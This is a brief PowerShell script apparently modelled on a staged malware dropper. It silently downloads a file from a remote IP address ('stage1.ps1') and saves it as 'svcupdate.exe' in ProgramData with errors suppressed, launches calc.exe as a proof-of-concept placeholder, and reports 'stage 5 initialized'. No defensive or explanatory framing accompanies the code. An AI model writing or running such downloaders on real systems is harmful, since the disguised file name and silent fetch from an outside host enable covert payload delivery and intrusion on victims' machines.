[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://203.0.113.49/stage1.ps1",
    [string]$Stage2Path = "C:\ProgramData\svcupdate.exe",
    [int]$RequestTimeout = 174
)
Invoke-WebRequest -Uri $RemoteUrl -OutFile $Stage2Path -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Write-Output "stage 5 initialized"
